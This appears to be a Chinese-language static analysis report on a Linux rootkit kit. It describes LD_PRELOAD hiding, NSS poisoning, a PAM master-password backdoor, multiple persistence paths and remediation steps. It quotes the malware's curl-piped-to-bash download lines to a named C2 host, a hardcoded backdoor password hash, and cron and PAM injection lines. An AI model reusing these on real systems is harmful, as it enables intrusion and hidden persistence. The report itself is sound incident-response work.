# Linux Rootkit 样本分析报告

**分析对象**：`samples/` 取证包（来源主机 154.219.110.37，Debian 11，2026-11-14 采集）
**分析方式**：仅静态分析（UPX 脱壳 + 反汇编 + 内嵌 ELF 提取），样本未在本机执行
**结论一句话**：这不是单个木马，而是一套「安装器 + 全局 LD_PRELOAD 隐藏库 + NSS 伪装模块 + PAM 万能密码后门 + SSH 公钥后门 + 命令替换 + 多重持久化 + C2 拉取脚本」的完整 Linux rootkit 套件。它把你服务器上的 `ps/top/ls/find/ss/netstat/last` 全部"骗"了一遍，所以你在服务器里看不到它。

## 2. 它是怎么"跑起来"的（执行链）

### 阶段 0｜进入与前置条件
- 必须 root 才能完成安装（程序中留有 `[-] ruleaza ca root` 的罗马尼亚语失败提示）。
- 通过 `/etc/os-release` 判断发行版（内置 `debian`/`redhat`/`authselect`/`pam-auth-update` 两套分支，兼容 Debian 系与 RHEL 系）。
- 单实例锁：`/var/log/.apt-cache.log` 里存 `PID:MARKER`，用 `__CHILD_MARKER` 环境变量比对，防止重复拉起（伪装成 apt 日志）。

### 阶段 1｜落地自身（3 个副本，互为备份）
```
/var/lib/systemd/cache-service          ← 主载荷（伪装成 systemd 缓存服务）
/usr/local/lib/.system-service          ← 备用副本
/var/tmp/876c7af6/01b51ec6              ← 备用副本（cron 用）
```
另外还有大量"看起来像系统组件"的目录/文件名：`/etc/.fontconfig-cache/.gvfs-cache/.sysconfig`、`/opt/.systemd-private/.pki/.sysconfig`、`/dev/shm/.Xgnupg-metadata/.fontconfig/.sysconfig` 等。

### 阶段 2｜持久化（同时铺 6 条路，删掉一条没用）
1. **cron.d**：`/etc/cron.d/systemd-timers`（`*/15 * * * *` 每 15 分钟重启一次）、`/etc/cron.d/systemd-boot`、`/etc/cron.d/systemd-boot-early`、`/etc/cron.d/.systemd-update-notifier`
   ```
   # System timer synchronization
   SHELL=/bin/sh
   @reboot root /usr/local/lib/.system-service > /dev/null 2>&1 &
   */15 * * * * root /usr/local/lib/.system-service > /dev/null 2>&1 || true
   ```
2. **root crontab**：`/var/spool/cron/crontabs/root` 追加 `@reboot/@daily/@monthly ... /var/tmp/876c7af6/./01b51ec6 & disown`
3. **systemd 服务**（名字全部伪造）：`systemd-resolved-cache.service`、`systemd-networkd-helper.service`、`systemd-timesyncd-update.service`、`dbus-system-helper.service`、`systemd-journald-cache.service`、`myservices.service`（`Description=Example systemd service.`，`Restart=always`，`RestartSec=1800`）
4. **systemd generator**：`/etc/systemd/system-generators/system-service-generator`、`/usr/local/lib/systemd/system-generators/update-checker` ——在开机早期生成 unit，绕开常规 unit 目录审计
5. **initramfs hook**：`/etc/initramfs-tools/hooks/zz-system-service`（Debian）/`/usr/share/initramfs-tools/hooks/zz-system-service` ——**打包进 initramfs，急救模式/单用户模式下也会被执行**
6. **shell 启动项**：`/root/.bashrc`、`.profile`、`.bash_profile`、`/home/*/.bashrc`，`/etc/rc.local`

> 设计意图：任何单点清理都会在 15 分钟内或下次重启后复活。

### 阶段 3｜全局隐藏（核心机制）

#### 3.1 `/etc/ld.so.preload` —— 最关键的一步
写入 `libnss_cache.so` / `libnss_cache.so.hider.<pid>` 的路径，使**系统上所有动态链接的程序**（`ps`、`top`、`ls`、`find`、`ss`、`netstat`、`last`、`who`、`lsof`、你自己的 shell…）在启动时自动加载隐藏库。

隐藏库导出了 **100+ 个被劫持的函数**（从符号表可直接读出）：
- **目录/文件**：`getdents64`、`readdir/readdir64/readdir_r`、`open/open64/openat/openat2`、`stat/lstat/fstatat/statx/__xstat*`、`access/faccessat/faccessat2`、`readlink/readlinkat`、`opendir/scandir`、`unlink/unlinkat/remove`、`rename/renameat/renameat2`、`mkdir/rmdir`、`chmod/chown/lchown/truncate`、`symlink/link`
- **进程**：`kill`、`killpg`、`tkill`、`tgkill`、`pidfd_open/pidfd_send_signal/pidfd_getfd`、`ptrace`、`process_vm_readv/process_vm_writev`、`kcmp`、`prlimit64`、`io_uring_*`（把"改 PID、读内存、发信号、io_uring 绕过"这几条路都堵上）
- **执行**：`execve/execveat/execv/execl/execvp/fexecve`（识别并过滤带 `--preload`、`--audit`、`--library-path` 的 ld.so 调用）
- **系统信息**：`sysinfo`、`socket/recvmsg`、`mount/umount/umount2`、`ioctl`、`getrlimit`

被隐藏的对象（字符串里全部可见）：
- `/proc/self|%d/stat`、`comm`、`status`、`cmdline`、`environ`、`exe`、`fd`、`maps`、`smaps*`、`mountinfo`、`mounts`、`numa_maps` → 进程在 `ps/top` 里"消失"，`cmdline`/`environ` 被替换
- `/proc/net/tcp|tcp6|udp|raw|unix|nf_conntrack` + `sport=`/`dport=` → **恶意监听端口/连接在 `ss/netstat` 里消失**
- `/var/run/utmp`、`/var/log/wtmp`、`/var/log/btmp`、`/var/adm/wtmp` → **攻击者的登录记录在 `last/lastb/who` 里消失**
- `/proc/meminfo`（`open_fake_meminfo`）→ **伪造内存占用，掩护挖矿进程**
- `/etc/ld.so.preload`、`/etc/cron.d/`、`/etc/pam.d/`、`/etc/systemd/system/`、`/lib/systemd/system/`、`~/.bashrc`、`/etc/passwd` 相关路径 → 清理时你自己也会"看不见"这些文件
- 进程名黑名单：`ls top xxd hexdump strings find egrep fgrep sed gawk less more tail head`、`busybox toybox BusyBox`、`unhide`、`rkhunter` 相关
- 反取证：识别自身是否被调试（环境变量 `__CHILD_MARKER`、`__WATCHDOG_MARKER`、`__WATCHDOG_MONITOR`、`__DECOY__`、`__MASKED__`、`__BACKUP_CHECK`、`LANG_OVERRIDE____`、`LOCAL_FLAG`、`INITIALIZED_STATE_`、`MARINICA_BISCUITE`），命中就走"decoy"路径

#### 3.2 NSS 投毒（`/etc/nsswitch.conf`）
改为：
```
passwd:         files ninel
shadow:         files ninel
group:          files ninel
```
`ninel` 模块 = 内嵌的 `libnss_ninel.so.2`（落到 `/lib/x86_64-linux-gnu/`、`/usr/lib/`、`/lib64/`、`/lib/aarch64-linux-gnu/`、`/usr/lib64/`）。
反汇编 `_nss_ninel_getpwnam_r` / `_nss_ninel_getspnam_r` 后可确认：它只对**用户名完全等于 `ninel`（6 字节比较）**时返回一条**伪造记录**（`pw_name=ninel`、`pw_passwd=x`、`uid=gid=9999`、`pw_dir=/dev/null`、`pw_shell=/bin/bash`），其他查询一律透传给 `files`。
它的作用是：让 `nsswitch.conf` 里凭空多出来的模块"看起来合法"，同时给攻击者账户一个可在 NSS 层"说得通"的投影；真正的隐藏由 LD_PRELOAD 库 + 被替换的命令完成。

#### 3.3 替换系统命令
`/usr/bin/rm`、`/usr/bin/kill`、`/usr/bin/chattr`、`/usr/bin/passwd`、`/usr/bin/chpasswd`（以及 `/usr/sbin/chattr`、`/usr/sbin/kill`、`/usr/libexec/.rm`、`/usr/libexec/.kill`、`/usr/libexec/.chatattr`）被换成 **UPX 加壳、内嵌隐藏逻辑的版本**；原文件被"备份"到 `/dev/shm/.orig_%s`（`.orig_rm`/`.orig_kill`/`.orig_passwd`/`.orig_chattr`）。
后果：
- 你用 `rm` 删它的文件 → 静默不删（被 hook 拦截）；
- 你用 `kill` 杀它的进程 → 不杀（`kill()` 返回成功但不生效）；
- 你用 `chattr` 解锁 → 无效；
- 你用 `passwd` 改密码 → 可能被记录/篡改。
（`orig_rm` 的反汇编 `.rodata` 里同时存在 GNU rm 9.1 的帮助文本 **和** `/tmp/.libnss_cache.so`、`/etc/ld.so.preload`、`/etc/.pm`、`/lib/security/pam_master.so` 等路径 —— 证明它是"带木马逻辑的 rm 仿制品"，不是真 coreutils。）

#### 3.4 日志清洗
目标文件：`/var/log/auth.log`、`/var/log/secure`、`/var/log/syslog`、`/var/log/messages`、`/var/log/daemon.log`，加上 utmp/wtmp/btmp 的 hook 过滤。**所以你事后翻 auth.log 基本看不到异常登录。**

### 阶段 4｜后门（拿到 root 之后还能再回来）

#### 4.1 PAM 万能密码后门（最危险）
`pam_master.so` 被复制到：`/lib/security/`、`/lib64/security/`、`/lib/x86_64-linux-gnu/security/`、`/lib/aarch64-linux-gnu/security/`、`/usr/lib64/security/`
并注入 PAM 栈：
```
/etc/pam.d/common-auth      auth     [success=done default=ignore] pam_master.so
/etc/pam.d/common-account   account  optional pam_master.so
/etc/pam.d/common-session   session  optional pam_master.so
```
反汇编 `pam_sm_authenticate → is_master` 得到的逻辑：
1. `pam_get_user()` 取用户名 → `pam_get_authtok()` 取密码；
2. `open("/etc/.pm", O_RDONLY)` 读 511 字节，去掉尾部空白/换行；
3. 若内容包含 `REPLACE` → 使用**硬编码备用哈希**：
   ```
   $6$cONA0kbmpUGiT1Vt$j7LdoaXFCMA5lr32B/LMOnvY3z7id6CUEfSl9hIl9lH0kSYNIq.NLLLnGJ7lPCuqnQqHwDnzWO19SNzwD8Fgs/
   ```
4. 否则 `crypt_r(用户输入, /etc/.pm 内容)` 与 `/etc/.pm` 逐字节 `strcmp`；
5. 匹配成功 → `pam_set_data("pmf", "1")` 并返回 `PAM_SUCCESS`，**对任意账户（含 root）直接放行**；`pam_sm_acct_mgmt` 只要看到这个标记就放行（绕过过期/锁定检查）。

也就是说：**只要密码等于攻击者设定口令，任何人都能用任意用户名登录 root。** 这是"服务器被反复接管"的主因之一。实际口令取决于服务器上的 `/etc/.pm`（若其中是 `REPLACE` 则用上面的备用哈希）。我这边用常见口令做了字典比对，未命中，说明真实口令是攻击者自定义/随机生成的。

### 阶段 5｜远程控制与载荷下发
内置的回连/更新逻辑（纯文本可直接读）：
```sh
if curl -s --connect-timeout 15 195.24.237.240/.x/black3; then
    curl -s 195.24.237.240/.x/black3 | bash >/dev/null 2>&1
    curl -s --connect-timeout 15 digital.digitaldatainsights.org/.x/black3 | bash >/dev/null 2>&1
fi
```
- C2/分发：`195.24.237.240`、备用域名 `digital.digitaldatainsights.org`，路径 `/.x/black3`
- `black3` 是**动态脚本**，会按需下发后续载荷（拉矿机、拉扫描/爆破模块、改配置）。样本自身只带"下载器"，实际功能由 C2 决定。
- 内置 `is_dynamic_miner_path`、`MINER` 模块标识 → 具备矿机管理能力，可随时下发挖矿程序（配合 `/proc/meminfo` 伪造，CPU/内存异常也不易被发现）。

## 3. 为什么你在服务器上"看不到"它

| 你以为 | 实际 |
|---|---|
| `ps aux` 里没有可疑进程 | 隐藏库 hook 了 `getdents64`/`readdir`/`/proc/*/stat`，把它的 PID 从结果里剔掉了 |
| `ss -antp` 没看到外联 | `/proc/net/*` 被 hook，`sport/dport` 匹配的连接被过滤 |
| `ls /etc/cron.d` 很干净 | `/etc/cron.d/`、`/etc/pam.d/`、`/etc/systemd/system/`、`~/.bashrc` 等路径被 hook，读到的是"净化版"目录 |
| `last`/`who` 没异常登录 | utmp/wtmp/btmp 被 hook，攻击者的登录记录被剔除 |
| `auth.log` 没记录 | 日志被清理，且 `LogLevel QUIET` |
| `rm` 删了、`kill` 杀了 | 这两个命令本身已被替换成"假动作"版本 |
| 重装 coreutils 就好 | `/etc/ld.so.preload` + PAM + initramfs hook 还在，重启即复活 |
| 用 `/dev/shm/.orig_rm` 恢复命令 | **那是木马的一部分**，恢复 = 重新感染 |

## 5. 处置建议（顺序很重要）

> **先说结论**：root 权限 + PAM 后门 + initramfs 持久化 = **这台机器的信任链已经断了**。商业上正确的做法是：取证 → 换机重建 → 仅迁回数据文件（不含配置、不含二进制）。下面的脚本是"业务不能立刻停机"时的止血方案，跑完仍建议重建。

**清理顺序（错一步就白干）**：
1. **断网/限制出站**（或至少封 `195.24.237.240` 与 `digital.digitaldatainsights.org`），防止 C2 在你清理过程中下发新版本；
2. 先删 `/etc/ld.so.preload`（或清空其中恶意行）——这是隐藏库的总开关；**删完必须新开一个 SSH/控制台会话**，因为当前 shell 仍带着已加载的 hook；
3. 修 `/etc/nsswitch.conf`（去掉 `ninel`）；
4. 用**可信来源**重装被替换的命令（`apt-get install --reinstall coreutils passwd util-linux`），**不要**用 `/dev/shm/.orig_*`；
5. 摘 PAM：删 4 个 `pam_master.so`、从 `/etc/pam.d/common-*` 去掉 `pam_master.so` 行，或从 `.pm-bak` 还原；`pam-auth-update --force` 重生成；
6. 删 SSH 后门：`authorized_keys` 去 key、`sshd_config` 去 Match 块（或从 `.pm-bak` 还原）、删 `/var/tmp/updates-20260202`、`sshd -t` 校验后 reload；
7. 删账户：`/etc/passwd`、`/etc/shadow`、`/etc/group`、`/etc/gshadow` 里的 `ninel`/`node`，`/etc/sudoers.d/99-ninel-root`、`/etc/sudoers.d/node`；
8. 删持久化：cron.d 四件套 + root crontab 行 + systemd 六个 unit + generator + initramfs hook（`update-initramfs -u`）+ `/etc/rc.local` + 各 `.bashrc/.profile`；
9. 删载荷：`/var/lib/systemd/cache-service`、`/usr/local/lib/.system-service`、`/var/tmp/876c7af6`、`/usr/bin/ssshd`、`/usr/local/bin/systemd-*-helper`、`/tmp/.libnss_cache.so`、`/usr/local/lib/libnss_cache.so`、各 `libnss_ninel.so.2`、`/dev/shm/.orig_*`、`/dev/shm/.{pulse,config,X11-cache,...}` 伪装目录；
10. 杀进程（新会话里用 shell 内建 `kill` 或 `pkill`；若仍被杀不掉，进救援模式/单用户）；
11. 重启 + 复检（见 `自检清单`）。

**加固（重建后务必做）**：
- SSH 只开 key 登录、禁 root 直登、改非 22 端口、`AllowUsers` 白名单、`StrictModes yes`；
- 部署 `AIDE`/`Tripwire` 监控 `/etc/ld.so.preload`、`/etc/pam.d`、`/etc/nsswitch.conf`、`/lib*/security`、`/etc/cron.d`、`/root/.ssh`；
- 定期 `rpm -Va` / `debsums -c` 校验二进制完整性；
- 禁止 `/dev/shm` 执行（`noexec`）、限制 `LD_PRELOAD` 使用场景（加固版内核/audit 规则 `-a always,exit -F arch=b64 -S execve` 记录）；
- 关键系统用 `auditd` 记录 `ld.so.preload` 写入、PAM 配置修改。
